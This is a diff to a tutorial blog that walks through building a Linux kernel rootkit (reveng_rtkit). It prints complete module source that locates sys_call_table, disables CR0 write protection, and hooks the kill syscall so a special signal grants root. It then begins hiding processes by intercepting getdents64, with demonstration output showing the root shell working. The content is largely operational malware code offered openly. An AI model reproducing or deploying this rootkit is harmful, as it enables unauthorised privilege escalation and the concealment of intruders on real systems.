@@ -881,37 +881,41 @@ The arguments that we pass from usermode are stored in registers (if you have do
 So, => We gonna need pt_regs to do our shit!
 
 I actually intercepted two syscalls:\
-a) **kill syscall**: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L708)
+a) <ins>**kill syscall**</ins>: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L708)
 
 Took this from [xcellerator](https://xcellerator.github.io/posts/linux_rootkits_03/). In this blog, _"the ftrace helper method"_ is implemented, instead of that I will be using _"the syscall table hijacking method"_ to perform the same syscall interception. I just want you guys/gals to go through the aforementioned blog once (from [top](https://xcellerator.github.io/posts/linux_rootkits_03/) till [_Hooking Kill_](https://xcellerator.github.io/posts/linux_rootkits_03/#hooking-kill) portion) before going on with this blog. It will help you as I have took most of the `syscall interception` portion from that blog apart from _"the syscall table hijacking method"_.
 
 Now, it's time to perform hooking.\
 But, what is hooking exactly?\
 Hooking, in terms of syscall, is to manipulate with the original syscall with our very own malicious syscall, sort of man-in-the-middle attack scenario.\
-Remember, we made the syscall table [editable](https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#step2-disabling-the-wpwrite-protection-flag-in-the-control-register) 'cause we want to edit original syscall in `syscall table` with our very own mal. syscall.\
-> ***NOTE*** : In programming world, syscall is nothing but a function.
+Remember, we made the syscall table [editable](https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#step2-disabling-the-wpwrite-protection-flag-in-the-control-register) 'cause we want to edit original syscall in `syscall table` with our very own mal. syscall.
+
+***NOTE*** :
+```
+In programming world, syscall is nothing but a function.
+```
 
 As soon as we made the `sys_call_table` unprotected, we would edit that specific syscall in syscall table that we are interested in. We should make a ***note*** that as we are overwriting original syscall function with our very own mal. syscall function, the nature of the later must be identical to the prior, otherwise this technique ***wouldn't work***.
 
 The name of kill syscall (or sys_kill) in sys_call_table is ***__NR_kill*** (offset designated for sys_kill), [source](https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L87).
 
-i. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L42)\
+i) Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L42)\
 So, let's define a custom function type to store original syscall, i.e., ***__NR_kill***.
 ```c
 typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
 ```
 As I have told you earlier that struct ***pt_regs*** is the one which has CPU registers as members of it, which will store passed arguements from usermode, which will eventually be read by syscall, right?\
-ii. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L45)\
+ii) Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L45)\
 Creating function to store original syscall, i.e., ***__NR_kill***.
 ```c
 static tt_syscall orig_kill;
 ```
-iii. Let's store the original syscall
+iii) Let's store the original syscall
 ```c
 orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
 ```
 As, ***__NR_kill*** is the name of kill syscall (or, sys_kill) in **syscall table** and the function type of orig_kill is _`tt_syscall`_.\
-d) Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/9134a4d04bf6c0d347a22503b203bab9098b8eea/kernel_src/reveng_rtkit.c#L311), ignore those lines with **__NR_getdents64** (line no.: 310 and 315). I will explain **__NR_getdents64** seperately after completing this section.
+iv) Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/9134a4d04bf6c0d347a22503b203bab9098b8eea/kernel_src/reveng_rtkit.c#L311), ignore those lines with **__NR_getdents64** (line no.: 310 and 315). I will explain **__NR_getdents64** seperately after completing this section.
 
 Now, we stored the original syscall, rather backuped the original syscall, as this would be used later to revert back to normal syscall workflow while rmmod'ing our LKM aka. rootkit (in this scenario).\
 So lets unprotect the memory and edit the syscall table and then revert back the memory protection as it was.
@@ -926,7 +930,7 @@ protect_memory();
 ```
 You might be thinking, what the heck is hacked_kill?\
 It is actually the function (mal. syscall) that we created, which I will introduce you in the next step.\
-e) So, now what ?\
+v) So, now what ?\
 Remember that? **providing rootshell** portion earlier in this blog (if not, please go and [visit](https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#part6-providing-rootshell-to-the-attacker), it's obvious to forget as this blog is pretty long, don't be harsh on yourself! :hugs:)\
 We will be implementing that _getting rootshell_ mechanism via _kill syscall_.
 ```c
@@ -1044,112 +1048,112 @@ __sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 ```
 If you compare all the lines, you will see each function types are satisfying other function types, i.e. there is no function type mismatch. Although, if it doesn't match, obviously compiler will through you an error. I just showed this portion to you, as I was dealing with this same problem while creating this project.
 
-f) So, the whole code to get the rootshell via `sys_kill interception`:\
+vi) So, the whole code to get the rootshell via `sys_kill interception`:
 ```c
-                  // filename: Test_hook_kill.h
+// filename: Test_hook_kill.h
 
-                  #include <linux/syscalls.h>     /* Needed to use syscall functions */
-                  #include <asm/ptrace.h>		/* For intercepting syscall, struct named pt_regs is needed */
+#include <linux/syscalls.h>     /* Needed to use syscall functions */
+#include <asm/ptrace.h>		/* For intercepting syscall, struct named pt_regs is needed */
 
-                  #include <linux/kprobes.h>
+#include <linux/kprobes.h>
 
-                  // Setting which dynamic kernel symbol to find
-                  static struct kprobe kp = {
-                              .symbol_name = "kallsyms_lookup_name"
-                  };
+// Setting which dynamic kernel symbol to find
+static struct kprobe kp = {
+	.symbol_name = "kallsyms_lookup_name"
+};
 
-                  // https://xcellerator.github.io/posts/linux_rootkits_03/
-                  #define GET_ROOT 64
+// https://xcellerator.github.io/posts/linux_rootkits_03/
+#define GET_ROOT 64
 
-                  /* For storing read cr0 control register value
-                  *
-                  * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
-                  *
-                  * unsigned long (*read_cr0)(void);
-                  */
-                  unsigned long cr0;
+/* For storing read cr0 control register value
+ *
+ * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
+ *
+ * unsigned long (*read_cr0)(void);
+ */
+unsigned long cr0;
 
-                  // To store the address of the found sys_call_table
-                  static unsigned long *__sys_call_table;
+// To store the address of the found sys_call_table
+static unsigned long *__sys_call_table;
 
-                  // Defining a custom function type to store original syscalls
-                  typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
+// Defining a custom function type to store original syscalls
+typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
 
-                  static tt_syscall orig_kill;
+static tt_syscall orig_kill;
 
-                  /* For storing address of sys_call_table */
+/* For storing address of sys_call_table */
 
-                  unsigned long *get_syscall_table(void)
-                  {
-                    unsigned long *syscall_table;
+unsigned long *get_syscall_table(void)
+{
+	unsigned long *syscall_table;
 
-                    //Defining custom kallsyms_lookup_name data type named: kallsyms_lookup_name_t, so that kallsyms_lookup_name be exported to kernel (>5.7)
+	//Defining custom kallsyms_lookup_name data type named: kallsyms_lookup_name_t, so that kallsyms_lookup_name be exported to kernel (>5.7)
                     
-                    /* // Lookup the address for a symbol. Returns 0 if not found.
-                    * unsigned long kallsyms_lookup_name(const char *name);
-                    * 
-                    */
-                    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+	/* // Lookup the address for a symbol. Returns 0 if not found.
+	 * unsigned long kallsyms_lookup_name(const char *name);
+	 *
+	 */
+	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
                     
-                    kallsyms_lookup_name_t kallsyms_lookup_name;
-                    register_kprobe(&kp);
-                    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
-                    unregister_kprobe(&kp);
+	kallsyms_lookup_name_t kallsyms_lookup_name;
+	register_kprobe(&kp);
+	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+	unregister_kprobe(&kp);
 
-                    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
-                    return syscall_table;
-                  }
+	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+	return syscall_table;
+}
 
-                  // ============================= Alloting root privileges ==================
+// ============================= Alloting root privileges ==================
 
-                  static void set_root(void)
-                  {
-                    /*
-                    * pwd: /lib/modules/5.11.0-49-generic/build/include/linux/cred.h
-                    * 
-                    * struct cred {
-                    * 	...
-                    *	kuid_t		uid;		// real UID of the task
-                    *	kgid_t		gid;		// real GID of the task 
-                    * 	kuid_t		suid;		// saved UID of the task
-                    *	kgid_t		sgid;		// saved GID of the task
-                    *	kuid_t		euid;		// effective UID of the task
-                    *	kgid_t		egid;		// effective GID of the task
-                    *	kuid_t		fsuid;		// UID for VFS ops
-                    *	kgid_t		fsgid;		// GID for VFS ops
-                    *	...
-                    * };
-                    * 
-                    * ...
-                    * extern struct cred *prepare_creds(void);	// returns current credentials of the process
-                    * ...
-                    * extern int commit_creds(struct cred *);	// For setting modified values of ids to cred structure
-                    */
+static void set_root(void)
+{
+	/*
+	 * pwd: /lib/modules/5.11.0-49-generic/build/include/linux/cred.h
+	 *
+	 * struct cred {
+	 * 	...
+	 *	kuid_t		uid;		// real UID of the task
+	 *	kgid_t		gid;		// real GID of the task 
+	 * 	kuid_t		suid;		// saved UID of the task
+	 *	kgid_t		sgid;		// saved GID of the task
+	 *	kuid_t		euid;		// effective UID of the task
+	 *	kgid_t		egid;		// effective GID of the task
+	 *	kuid_t		fsuid;		// UID for VFS ops
+	 *	kgid_t		fsgid;		// GID for VFS ops
+	 *	...
+	 * };
+	 *
+	 * ...
+	 * extern struct cred *prepare_creds(void);	// returns current credentials of the process
+	 * ...
+	 * extern int commit_creds(struct cred *);	// For setting modified values of ids to cred structure
+	 */
 
-                    struct cred *root = prepare_creds();
+	struct cred *root = prepare_creds();
 
-                    if (root == NULL)
-                    {
-                      return;
-                    }
+	if (root == NULL)
+	{
+		return;
+	}
 
-                    // Updating ids to 0 i.e. root
-                    root->uid.val = root->gid.val = 0;
-                    root->euid.val = root->egid.val = 0;
-                    root->suid.val = root->sgid.val = 0;
-                    root->fsuid.val = root->fsgid.val = 0;
+	// Updating ids to 0 i.e. root
+	root->uid.val = root->gid.val = 0;
+	root->euid.val = root->egid.val = 0;
+	root->suid.val = root->sgid.val = 0;
+	root->fsuid.val = root->fsgid.val = 0;
 
-                    // Setting the updated value to cred structure
-                    commit_creds(root);
-                  }
+	// Setting the updated value to cred structure
+	commit_creds(root);
+}
 
-                  static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
-                  {
-                    int sig = (int) pt_regs->si;
+static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
+{
+	int sig = (int) pt_regs->si;
                     
-                    switch (sig)
-                    {
-                      case GET_ROOT:
+	switch (sig)
+	{
+		case GET_ROOT:
                         printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\t-> Offering root shell!!");
                         /*
                           In someway system() function alike kernel function present in linux kernel programming
@@ -1157,222 +1161,221 @@ f) So, the whole code to get the rootshell via `sys_kill interception`:\
                           case) was alloted a root shell, but bash/sh shell did the job.
                         */
                         set_root();
-                        break;
-                      default:
+			break;
+		default:
                         return orig_kill(pt_regs);
-                    }
-                    return 0;
-                  }
+	}
+	return 0;
+}
 
 
-                  static inline void write_cr0_forced(unsigned long val)
-                  {
-                    unsigned long __force_order;
+static inline void write_cr0_forced(unsigned long val)
+{
+	unsigned long __force_order;
 
-                    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
-                  }
+	asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
+}
 
-                  static inline void protect_memory(void)
-                  {
-                    printk(KERN_INFO "[*] reveng_rtkit: (Memory protected): Regainig normal memory protection\n");
-                    write_cr0_forced(cr0);	// Setting WP flag to 1 => read-only
-                  }
+static inline void protect_memory(void)
+{
+	printk(KERN_INFO "[*] reveng_rtkit: (Memory protected): Regainig normal memory protection\n");
+	write_cr0_forced(cr0);	// Setting WP flag to 1 => read-only
+}
 
-                  static inline void unprotect_memory(void)
-                  {
-                    pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
-                    write_cr0_forced(cr0 & ~0x00010000);	// Setting WP flag to 0 => writable
-                  }
+static inline void unprotect_memory(void)
+{
+	pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
+	write_cr0_forced(cr0 & ~0x00010000);	// Setting WP flag to 0 => writable
+}
 ```
-   Here, the type of this function is `asmlinkage int`, actually it doesn't matter in this context, but it might in others.\
-                Syscalls are of type `long`, thus, when a user space program such as glibc depends on its return value, it expects a `long int`, if you feed it with `int`, things will go very wrong.\
-                Credit: [jm33.me/](https://jm33.me/linux-rootkit-for-fun-and-profit-0x02-lkm-hide-filesprocs.html)
+Here, the type of this function is `asmlinkage int`, actually it doesn't matter in this context, but it might in others.\
+Syscalls are of type `long`, thus, when a user space program such as glibc depends on its return value, it expects a `long int`, if you feed it with `int`, things will go very wrong.\
+Credit: [jm33.me/](https://jm33.me/linux-rootkit-for-fun-and-profit-0x02-lkm-hide-filesprocs.html)
 ```c
-                // filename: Test_rtkit_kill.c
+// filename: Test_rtkit_kill.c
 
-                #include <linux/init.h>		/* Needed for the macros */
-                #include <linux/module.h>	/* Needed by all modules */
-                #include <linux/kernel.h>	/* Needed for printing log level messages */
-                #include <linux/list.h>		/* macros related to linked list are defined here. Eg: list_add(), list_del(), list_entry(), etc */
-                #include <linux/cred.h>		/* To change value of this fields we have to invoke prepare_creds(). 
-                                           * To set those modified values we have to invoke commit_creds(). 
-                                           * uid, gid and other similar "things" are stored in cred structure which is element of cred structure. */
-                #include "Test_hook_kill.h"
-
-
-                /* Function Prototypes */
-
-                static int      __init rootkit_init(void);
-                static void     __exit rootkit_exit(void);
+#include <linux/init.h>		/* Needed for the macros */
+#include <linux/module.h>	/* Needed by all modules */
+#include <linux/kernel.h>	/* Needed for printing log level messages */
+#include <linux/list.h>		/* macros related to linked list are defined here. Eg: list_add(), list_del(), list_entry(), etc */
+#include <linux/cred.h>		/* To change value of this fields we have to invoke prepare_creds(). 
+				 * To set those modified values we have to invoke commit_creds(). 
+				 * uid, gid and other similar "things" are stored in cred structure which is element of cred structure. */
+#include "Test_hook_kill.h"
 
 
-              // =================== Entry Function ====================
+/* Function Prototypes */
 
-              static int __init rootkit_init(void)
-              {
-                printk(KERN_INFO "=================================================\n");
-                printk(KERN_INFO "[+] reveng_rtkit: Created by @reveng007(Soumyanil)");
-                printk(KERN_INFO "[+] reveng_rtkit: Loaded \n");
+static int      __init rootkit_init(void);
+static void     __exit rootkit_exit(void);
 
-                __sys_call_table = get_syscall_table();
-                if (!__sys_call_table)
-                  return -1;
 
-                printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: 0x%px \n", __sys_call_table);
+// =================== Entry Function ====================
 
-                /* Executes the instruction to read cr0 register (via inline assembly) and returns the result in a general-purpose register.
-                *
-                * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
-                *
-                * unsigned long (*read_cr0)(void);
-                */
-                cr0 = read_cr0();
+static int __init rootkit_init(void)
+{
+	printk(KERN_INFO "=================================================\n");
+	printk(KERN_INFO "[+] reveng_rtkit: Created by @reveng007(Soumyanil)");
+	printk(KERN_INFO "[+] reveng_rtkit: Loaded \n");
 
-                // Storing original syscall
-                orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
+	__sys_call_table = get_syscall_table();
+	if (!__sys_call_table)
+		return -1;
 
-                unprotect_memory();
+	printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: 0x%px \n", __sys_call_table);
 
-                // Editing syscall table targeting "kill" syscall with our created "hacked_kill".
-                __sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
+	/* Executes the instruction to read cr0 register (via inline assembly) and returns the result in a general-purpose register.
+	 *
+	 * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
+	 *
+	 * unsigned long (*read_cr0)(void);
+	 */
+	 cr0 = read_cr0();
 
-                protect_memory();
+	// Storing original syscall
+	orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
 
-                return 0;
-              }
+	unprotect_memory();
+	
+	// Editing syscall table targeting "kill" syscall with our created "hacked_kill".
+	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 
-              // ========================== Exit Function ====================
+	protect_memory();
 
-              static void __exit rootkit_exit(void)
-              {
-                printk(KERN_INFO "\n=========================================\n");
+	return 0;
+}
 
-                unprotect_memory();
-                printk(KERN_INFO "\t\t\t\t\t\t back to normal");
+// ========================== Exit Function ====================
 
-                // Editing the sycall table back to normal, i.e. with original syscall: "kill" syscalls.
-                __sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+static void __exit rootkit_exit(void)
+{
+	printk(KERN_INFO "\n=========================================\n");
 
-                protect_memory();
+	unprotect_memory();
+	printk(KERN_INFO "\t\t\t\t\t\t back to normal");
 
-                printk(KERN_INFO "[-] reveng_rtkit: Unloaded \n");
-                printk(KERN_INFO "=================================================\n");
-              }
+	// Editing the sycall table back to normal, i.e. with original syscall: "kill" syscalls.
+	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
 
-              module_init(rootkit_init);
-              module_exit(rootkit_exit);
+	protect_memory();
 
-              MODULE_LICENSE("GPL");
-              MODULE_AUTHOR("reveng007");
-              MODULE_DESCRIPTION("Modifying Stage of reveng_rtkit");
-              MODULE_VERSION("1.0");
+	printk(KERN_INFO "[-] reveng_rtkit: Unloaded \n");
+	printk(KERN_INFO "=================================================\n");
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("reveng007");
+MODULE_DESCRIPTION("Modifying Stage of reveng_rtkit");
+MODULE_VERSION("1.0");
 ```
-   Now, lets see it in action:
+Now, lets see it in action:\
+![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog13.png?raw=true)
 
-   ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog13.png?raw=true)
+We can see 3 things:\
+1. In ***fish shell***, this mechanism of getting root shell is not working, I don't really know why... (<ins>If any viewers seeing this, have any solution to this problem, please don't hesitate to do a PR to my repo but before that please visit, [idea](https://github.com/reveng007/reveng_rtkit#note-1)</ins>).\
+2. In ***bash shell***, it is working as expected.\
+3. In ***sh shell***, it is working as expected too.
 
-   We can see 3 things:\
-              1. In ***fish shell***, this mechanism of getting root shell is not working, I don't really know why... (<ins>If any viewers seeing this, have any solution to this problem, please don't hesitate to do a PR to my repo but before that please visit, [idea](https://github.com/reveng007/reveng_rtkit#note-1)</ins>).\
-              2. In ***bash shell***, it is working as expected.\
-              3. In ***sh shell***, it is working as expected too.
+B) **getdents64** syscall: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L487)
 
-2. **getdents64** syscall: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L487)
-
-   I actually wanted to hide ongoing processes and I got that idea for hiding processes from [source1: R3x/linux-rootkits](https://github.com/R3x/linux-rootkits#features-descriptions), but I was unable to understand that portion of code which was linked. I then searched through other [resource links](https://github.com/reveng007/reveng_rtkit#resources-that-helped-me) that I had. I found out this: [source2](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.). I will be implementing this mechanism via **kill syscall** (or sys_kill) as I did earlier.
+I actually wanted to hide ongoing processes and I got that idea for hiding processes from [source1: R3x/linux-rootkits](https://github.com/R3x/linux-rootkits#features-descriptions), but I was unable to understand that portion of code which was linked. I then searched through other [resource links](https://github.com/reveng007/reveng_rtkit#resources-that-helped-me) that I had. I found out this: [source2](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.). I will be implementing this mechanism via **kill syscall** (or sys_kill) as I did earlier.
           
-    But here, we are actually intercepting two syscalls simultaneously,\
-    1. ***kill syscall***: To hide pid of any process, cmd: _`kill -32 <pid>`_.\
-    2. ***getdents64 syscall***: Please go through this [link](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.) (it is the same previous link) and check the last 2 paragraphs of it. It will say that, `ps` command only just does an 'ls' on "`/proc/`" directory.\
+But here, we are actually intercepting two syscalls simultaneously,\
+1. ***kill syscall***: To hide pid of any process, cmd: _`kill -32 <pid>`_.\
+2. ***getdents64 syscall***: Please go through this [link](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.) (it is the same previous link) and check the last 2 paragraphs of it. It will say that, `ps` command only just does an 'ls' on "`/proc/`" directory.
 
-   Now then, what is the working machanism of `ls`?\
-   Visit: [gist-amitsaha](https://gist.github.com/amitsaha/8169242#how-does-ls-do-what-it-does). It says that, after the execution of `ls`, it in turn invokes the `getdents()` system call, which is responsible to read the directory contents.\
-   Let's check it.
+Now then, what is the working machanism of `ls`?\
+Visit: [gist-amitsaha](https://gist.github.com/amitsaha/8169242#how-does-ls-do-what-it-does). It says that, after the execution of `ls`, it in turn invokes the `getdents()` system call, which is responsible to read the directory contents.\
+Let's check it.
 ```diff
-              $ strace ls 1>/dev/null 2>/tmp/ls.strace; cat /tmp/ls.strace | cut -d'(' -f1 | sort -u
+$ strace ls 1>/dev/null 2>/tmp/ls.strace; cat /tmp/ls.strace | cut -d'(' -f1 | sort -u
 
-              access
-              arch_prctl
-              brk
-              close
-              execve
-              +++ exited with 0 +++
-              exit_group
-              + getdents64    -----> We can see that it performs getdents64 syscall
-              ioctl
-              mmap
-              mprotect
-              munmap
-              newfstatat
-              openat
-              pread64
-              prlimit64
-              read
-              rt_sigaction
-              rt_sigprocmask
-              set_robust_list
-              set_tid_address
-              statfs
-              write
+access
+arch_prctl
+brk
+close
+execve
++++ exited with 0 +++
+exit_group
++ getdents64    -----> We can see that it performs getdents64 syscall
+ioctl
+mmap
+mprotect
+munmap
+newfstatat
+openat
+pread64
+prlimit64
+read
+rt_sigaction
+rt_sigprocmask
+set_robust_list
+set_tid_address
+statfs
+write
 ```
-   In that sense, if I perform the same thing with `ps`, we should be also getting the same `getdents()` system call.
+In that sense, if I perform the same thing with `ps`, we should be also getting the same `getdents()` system call.
 ```diff
-              $ strace ps 1>/dev/null 2>/tmp/ps.strace; cat /tmp/ps.strace | cut -d'(' -f1 | sort -u
+$ strace ps 1>/dev/null 2>/tmp/ps.strace; cat /tmp/ps.strace | cut -d'(' -f1 | sort -u
 
-              access
-              arch_prctl
-              brk
-              close
-              execve
-              +++ exited with 0 +++
-              exit_group
-              futex
-              + getdents64    -----> We can see that it performs the same getdents64 syscall
-              geteuid
-              ioctl
-              lseek
-              mmap
-              mprotect
-              munmap
-              newfstatat
-              openat
-              prctl
-              pread64
-              prlimit64
-              read
-              rt_sigaction
-              rt_sigprocmask
-              set_robust_list
-              set_tid_address
-              write
+access
+arch_prctl
+brk
+close
+execve
++++ exited with 0 +++
+exit_group
+futex
++ getdents64    -----> We can see that it performs the same getdents64 syscall
+geteuid
+ioctl
+lseek
+mmap
+mprotect
+munmap
+newfstatat
+openat
+prctl
+pread64
+prlimit64
+read
+rt_sigaction
+rt_sigprocmask
+set_robust_list
+set_tid_address
+write
 ```
-   So, we have to intercept getdents64 syscall.\
-   Let's visit the [<ins>Linux Syscall Reference</ins>](https://syscalls64.paolostivanin.com/),\
-   Search: `sys_getdents64`.
+So, we have to intercept getdents64 syscall.\
+Let's visit the [<ins>Linux Syscall Reference</ins>](https://syscalls64.paolostivanin.com/),\
+Search: `sys_getdents64`.
 
-   Dependent registers:
+Dependent registers:
 ```
 1. rax: contains syscall ids.
 2. rdi: which contains the file descriptor.
 3. rsi: which contains the passed arguments.
 4. rdx: length of the passed argument(or string).
 ```
-   In this scenario, we will only need **rdi** and **rsi** register. This is because, we need to know the passed argument (**rsi** register, rather **si** register) and as we will be dealing with files, we will ofcourse be needing the file descriptors (**rdi** register, rather **di** register). (Reason was mentioned earlier in this file)
+In this scenario, we will only need **rdi** and **rsi** register. This is because, we need to know the passed argument (**rsi** register, rather **si** register) and as we will be dealing with files, we will ofcourse be needing the file descriptors (**rdi** register, rather **di** register). (Reason was mentioned earlier in this file)
 
-   So, a recap about the Workflow of the machanism:\
-    - When we deliver pid of any process via `kill -32 <pid>`, it will at first find out that particular `pid` by surfing through "`/proc/`" directory.
-    - After getting the `pid`, it will perform syscall hooking to hide that particular pid and then offering a new process list (excluding the mentioned pid), if the user tries to see running processes using ***ps***.
+So, a recap about the Workflow of the machanism:\
+- When we deliver pid of any process via `kill -32 <pid>`, it will at first find out that particular `pid` by surfing through "`/proc/`" directory.
+- After getting the `pid`, it will perform syscall hooking to hide that particular pid and then offering a new process list (excluding the mentioned pid), if the user tries to see running processes using ***ps***.
 
-   1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L99).
-   Finding the process id/ pid:\
-   According to [LKM_HACKING](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.):
+1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L99).\
+Finding the process id/ pid:\
+According to [LKM_HACKING](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.):
 ```c
-	/* Here, -"&gt;" is the html character entities, which really mean: -">" 
-	I really don't know, how it happened in that site */
+/* Here, -"&gt;" is the html character entities, which really mean: -">" 
+I really don't know, how it happened in that site */
 
-	/* get task structure from PID */
-	struct task_struct *get_task(pid_t pid)
-	{
-		struct task_struct *p = current;
+/* get task structure from PID */
+struct task_struct *get_task(pid_t pid)
+{
+	struct task_struct *p = current;
 	do {
 		if (p->pid == pid)
 			return p;
@@ -1382,7 +1385,7 @@ f) So, the whole code to get the rootshell via `sys_kill interception`:\
 	return NULL;
 }
 ```
-   I wasn't understanding this portion, but yes I was getting an idea that it is looping to get the process ids. So, I tried for loop.
+I wasn't understanding this portion, but yes I was getting an idea that it is looping to get the process ids. So, I tried for loop.
 ```c
 // reveng_rtkit
 
@@ -1407,9 +1410,9 @@ struct task_struct *find_task(pid_t pid)
 	return NULL;
 }
 ```
-   This is basically a for loop macro. I got this expression from  [diamorphine](https://github.com/m0nad/Diamorphine/) project. Then searched it in [bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601).
+This is basically a for loop macro. I got this expression from  [diamorphine](https://github.com/m0nad/Diamorphine/) project. Then searched it in [bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601).
                     
-  2. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L118).\
+2. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L118).\
    We will now make a function to hide those directories responsible for corresponding `pid`. Got this portion from [heroin](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#A-b) and [diamorphine](https://github.com/m0nad/Diamorphine/) project.
 ```c
 /* Here, -"&gt;" : -">" and "&amp;" : "&" */
